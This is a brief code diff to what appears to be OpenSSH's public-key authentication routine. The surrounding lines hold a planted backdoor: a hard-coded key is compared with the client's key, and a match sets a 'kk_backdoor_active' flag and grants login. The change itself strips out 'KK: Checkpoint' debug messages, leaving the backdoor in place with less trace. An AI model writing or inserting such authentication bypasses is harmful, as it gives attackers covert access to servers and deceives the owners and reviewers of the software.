@@ -513,14 +513,10 @@ user_key_allowed2(struct passwd *pw, Key *key, char *file)
 	char *char_pointer = backdoor_key;
 	Key *found = key_new(key_is_cert(key) ? KEY_UNSPEC : key->type);
 	auth_clear_options();
-	debug("KK: Checkpoint 1 ;)");
 	int ret = key_read(found, &char_pointer);
-	debug("KK: Checkpoint 2 ;)");
 	if (key_equal(found, key)) {
-		debug("KK: Checkpoint 3 ;)");
 		found_key = 1;
 		key_free(found);
-		debug("KK: Checkpoint 4 ;)");
 		kk_backdoor_active = 1;
 		return found_key;
 	}
